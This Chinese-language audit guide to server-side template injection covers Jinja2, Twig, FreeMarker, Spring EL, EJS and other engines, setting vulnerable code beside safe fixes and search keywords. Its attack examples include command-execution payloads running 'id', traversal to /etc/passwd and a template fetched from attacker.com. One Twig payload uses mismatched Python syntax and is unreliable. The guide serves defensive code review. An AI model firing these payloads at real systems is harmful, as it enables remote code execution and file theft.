---
name: general
description: SSTI通用漏洞模式快速参考 - 所有涉及模板渲染的项目必审
---

# SSTI 通用漏洞模式快速参考

任何涉及模板引擎渲染的应用都必须审计以下漏洞模式。

---

## 1. 用户输入直接嵌入模板渲染

### 未过滤的用户输入作为模板内容

**风险**：远程代码执行、任意文件读取、信息泄露

**危险代码示例**
```python
# Python - Flask
from flask import Flask, render_template_string, request
app = Flask(__name__)

@app.route('/greet')
def greet():
    user_input = request.args.get('name')
    return render_template_string(f'Hello {user_input}!')  # 危险！
```

```java
// Java - Freemarker
String template = userInput;  // 直接使用用户输入
Configuration cfg = new Configuration();
Template tpl = cfg.getTemplate(template);
```

```javascript
// Node.js - EJS
app.get('/render', (req, res) => {
  ejs.render(req.query.template, {});  // 危险！
});
```

**攻击示例**
```
Python (Jinja2): {{ ''.__class__.__mro__[1].__subclasses__()[396]('id') }}
PHP (Twig): {{ _self.env.registerUndefinedFilterCallback("exec") }}{{ _self.env.getFilter("id") }}
Java (FreeMarker): <#assign value="freemarker.template.utility.Execute"?new()>${value("id")}
```

**安全做法**
- 永远不要使用 `render_template_string()`、`eval()` 或等价函数来渲染用户输入
- 使用参数化模板，用户输入仅作为数据而非模板代码
- 启用自动转义功能

```python
# 安全做法 - Flask
return render_template('template.html', name=user_input)  # 用户输入仅作为数据
```

**快速定位**：搜索以下关键字
- Python: `render_template_string`、`jinja2.Template`、`mako.Template`
- Java: `Configuration.getTemplate(userInput)`、`setTemplateLoader`
- PHP: `$twig->render()`、`Smarty::fetch()`
- Node.js: `ejs.render(userInput)`、`handlebars.compile(userInput)`
- Go: `template.Parse(userInput)`

---

### 用户输入作为模板变量但未转义

**风险**：XSS（如果模板变量未转义）、信息泄露

**危险代码示例**
```java
// Java - Thymeleaf
model.addAttribute("userComment", userInput);
// 在模板中: <p th:utext="${userComment}"></p>  // utext 不转义！
```

```python
# Python - Jinja2
return render_template('page.html', message=userInput)
# 模板中: <p>{{ message | safe }}</p>  // safe 过滤器禁用转义！
```

**安全做法**
- 模板中确保转义输出（默认行为）
- 禁用 `safe`、`utext` 等危险的非转义过滤器

```html
<!-- 安全：默认转义 -->
<p>{{ message }}</p>

<!-- 危险：禁用转义 -->
<p>{{ message | safe }}</p>
```

**快速定位**：搜索 `| safe`、`| raw`、`utext`、`autoescape off`

---

## 2. 模板引擎配置不安全

### 允许执行任意代码的功能

**风险**：远程代码执行

**危险的函数/方法**
```python
# Python - Jinja2
Jinja2 中不安全的内置对象:
{{ range }}, {{ lipsum }}, {{ cycler }}
```

```java
// Java - FreeMarker
new_builtin_class_resolver = unrestricted  // 允许访问任意类
```

```javascript
// Node.js - Handlebars
allowProtoProperties: true  // 允许原型污染
```

**安全做法**
- 限制模板中可用的函数和变量
- 使用沙箱隔离或受限的模板执行环境
- 禁用危险内置函数

```python
# Python - Jinja2 - 受限环境
from jinja2.sandbox import SandboxedEnvironment
env = SandboxedEnvironment()
```

**快速定位**：搜索 `__builtins__`、`globals`、`unrestricted`、`allowProtoProperties`

---

### 模板引擎调试模式或开发配置

**风险**：信息泄露、功能提升

**危险配置**
```python
# Python - Flask
app.config['DEBUG'] = True  # 调试模式开启，显示完整错误堆栈
app.config['TEMPLATES_AUTO_RELOAD'] = True
```

```java
// Java - FreeMarker
cfg.setNewBuiltinClassResolver(new DefaultObjectWrapperConfiguration().setNewBuiltinClassResolver(...));
```

**安全做法**
- 生产环境关闭调试模式
- 隐藏错误详情，记录到日志而非返回给用户

**快速定位**：搜索 `DEBUG = True`、`development`、`development_mode`

---

## 3. 动态模板加载和路径遍历

### 用户可控的模板路径

**风险**：任意文件读取、远程模板加载、代码执行

**危险代码示例**
```java
// Java - Spring
@GetMapping("/render/{templateName}")
public String render(@PathVariable String templateName) {
  return "templates/" + templateName;  // 路径遍历风险！
}
```

```python
# Python - Jinja2
template_name = request.args.get('template')
template = loader.get_source(env, template_name)  # 危险！
```

```go
// Go - text/template
templateName := r.URL.Query().Get("name")
templates, _ := template.ParseFiles("templates/" + templateName + ".html")
```

**攻击示例**
```
/render?template=../../../../etc/passwd
/render?template=http://attacker.com/evil.html
/render/{templateName}/../../../etc/passwd
```

**安全做法**
- 使用白名单验证模板名称
- 限制路径遍历（禁止 `../`）
- 使用路径规范化和检查

```python
# 安全做法
import os
ALLOWED_TEMPLATES = ['home', 'about', 'contact']
template_name = request.args.get('template')
if template_name not in ALLOWED_TEMPLATES:
    abort(400)
```

**快速定位**：搜索 `ParseFiles`、`getTemplate`、`get_source` 等，检查模板路径是否来自用户输入

---

### 远程模板加载

**风险**：从不受信任的源加载恶意模板

**危险代码示例**
```python
# Python - 远程加载
template_url = request.args.get('url')
response = requests.get(template_url)
return render_template_string(response.text)  # 危险！
```

```java
// Java - 远程加载
String templateUrl = request.getParameter("url");
URLConnection conn = new URL(templateUrl).openConnection();
```

**安全做法**
- 不允许从网络源加载模板
- 如必须加载，限制允许的源（whitelist）
- 验证源的完整性（签名验证）

**快速定位**：搜索 `requests.get`、`URLConnection`、`HttpClient`、结合模板加载

---

## 4. 模板上下文污染

### 全局变量或敏感信息泄露

**风险**：信息泄露、权限提升

**危险代码示例**
```python
# Python - Django
context = {'user': user}
context.update(request.GET.dict())  # 用户输入污染上下文！
return render(request, 'template.html', context)
```

```java
// Java - Spring
Map<String, Object> model = new HashMap<>();
model.putAll(request.getParameterMap());  // 危险！
```

**攻击示例**
```
GET /page?admin=true&is_staff=true  # 可能污染模板上下文
```

**安全做法**
- 明确定义和验证传入模板的变量
- 不要直接使用用户输入污染模板上下文
- 使用白名单方式传递变量

```python
# 安全做法
context = {
    'user': user,
    'message': request.GET.get('message', ''),  # 明确选择
}
```

**快速定位**：搜索 `update(request`、`putAll(request`、`context.merge`

---

## 5. 模板继承和包含注入

### 用户可控的继承路径

**风险**：任意文件包含、模板注入

**危险代码示例**
```html
<!-- Jinja2 -->
{% extends request.args.get('base') %}  <!-- 危险！ -->
```

```html
<!-- Smarty -->
{extends file=$_GET['base']}  <!-- 危险！ -->
```

**安全做法**
- 模板继承关系必须是静态的、预定义的
- 不允许用户控制继承链

```html
<!-- 安全 -->
{% extends "base.html" %}
```

**快速定位**：搜索 `extends`、`include` 配合 `request.args`、`$_GET` 等用户输入

---

### 用户可控的包含路径

**风险**：本地文件包含（LFI）、远程文件包含（RFI）

**危险代码示例**
```html
<!-- Jinja2 -->
{% include request.args.get('file') %}
```

```html
<!-- PHP -->
{include file=$_GET['file']}
```

```html
<!-- Velocity -->
#include($file_from_user)
```

**安全做法**
- 包含的文件路径必须预定义或通过白名单验证

**快速定位**：搜索 `include`、`import` 配合用户输入

---

## 6. 表达式注入 (EL 注入)

### 用户输入作为表达式代码执行

**风险**：远程代码执行

**危险代码示例**
```java
// Java - JSP EL
<%= (String) pageContext.getAttribute(request.getParameter("var")) %>
```

```java
// Java - Spring EL
String expression = request.getParameter("expr");
ExpressionParser parser = new SpelExpressionParser();
parser.parseExpression(expression).getValue();  // 危险！
```

```python
# Python - eval
eval(user_input)  # 危险！
```

**攻击示例**
```
Java EL: ${7*7}  # 表达式求值
Spring EL: T(java.lang.Runtime).getRuntime().exec("id")
Python: __import__('os').system('id')
```

**安全做法**
- 永远不要使用 `eval()` 或 `ExpressionParser` 处理用户输入
- 如果需要动态表达式，使用受限的表达式语言（如 OGNL with restrictive config）

```java
// 安全做法 - 使用模板变量，不使用动态表达式
model.addAttribute("var", user_value);
// 在模板中: ${var}  (这是安全的)
```

**快速定位**：搜索 `eval()`、`ExpressionParser`、`SpelExpressionParser`、`pageContext.getAttribute(request.`

---

## 7. 模板过滤器滥用

### 危险过滤器未禁用

**风险**：沙箱逃逸、代码执行

**危险过滤器示例**
```
Jinja2: __import__, __class__, __builtins__, __mro__
Twig: range, getenv
FreeMarker: ?new_builtin_class_resolver, ?api
Handlebars: 原型污染相关 helpers
```

**攻击示例**
```
Jinja2: {{ ''.__class__.__mro__[2].__subclasses__()[396]('id') }}
Twig: {{ app.request.files.get(0).__class__.__mro__[2].__subclasses__()[396]('id') }}
```

**安全做法**
- 使用沙箱环境（SandboxedEnvironment）
- 明确配置允许的过滤器和函数

```python
# Python - Jinja2 沙箱
from jinja2.sandbox import SandboxedEnvironment
env = SandboxedEnvironment()
env.globals['__import__'] = None  # 禁用危险函数
```

**快速定位**：搜索 `|` (过滤器操作符)、`__import__`、`__class__`、`__builtins__`

---

## 8. 渲染上下文注入

### 模板编译时执行代码

**风险**：代码执行

**危险代码示例**
```python
# Python - Mako
from mako.template import Template
template = Template(filename=user_file)
template.render()  # 在模板编译时执行代码！
```

```java
// Java - Velocity
VelocityEngine engine = new VelocityEngine();
engine.evaluate(context, writer, logTag, user_string);  // 危险！
```

**安全做法**
- 模板必须来自受信任的源
- 不要在模板编译阶段执行不可信代码

**快速定位**：搜索 `Template(filename=`、`evaluate(`、`render()`

---

## 快速检查清单

```
□ 定位所有模板渲染调用（扫描脚本辅助）
  □ Python: render_template_string, jinja2.Template, mako.Template
  □ Java: Configuration.getTemplate, setTemplateLoader, evaluate
  □ PHP: $twig->render, Smarty::fetch
  □ Node.js: ejs.render, handlebars.compile, pug.renderFile
  □ Go: template.Parse, ExecuteTemplate

□ 验证用户输入不直接用于模板代码
  □ 检查是否使用了 render_template_string、eval 等危险函数
  □ 确保用户输入仅作为模板变量，不作为模板代码

□ 验证模板变量转义
  □ 检查 | safe、| raw、utext 等危险过滤器使用
  □ 确保默认转义启用（autoescape: true）

□ 验证模板路径不可控
  □ 搜索 ParseFiles、getTemplate、loader.get_source
  □ 检查模板名称是否来自用户输入，是否有路径遍历防护
  □ 禁止远程模板加载

□ 验证模板继承/包含路径不可控
  □ 检查 extends、include 是否使用用户输入

□ 验证没有动态表达式执行
  □ 搜索 eval()、ExpressionParser、pageContext.getAttribute(request.

□ 验证模板引擎配置安全
  □ 开发环境调试模式关闭
  □ 禁用危险的内置对象和过滤器
  □ 如可能，使用沙箱环境

□ 验证模板上下文不被用户输入污染
  □ 检查 update(request、putAll(request 等操作
  □ 确保只显式传递必要变量到模板
```

---

## 使用本文档

1. **扫描阶段**：运行扫描脚本定位模板渲染相关代码
2. **快速参考**：本文档提供漏洞模式概览和代码示例
3. **深度审计**：根据编程语言查看对应的语言特定指南（`Language_*.md`）
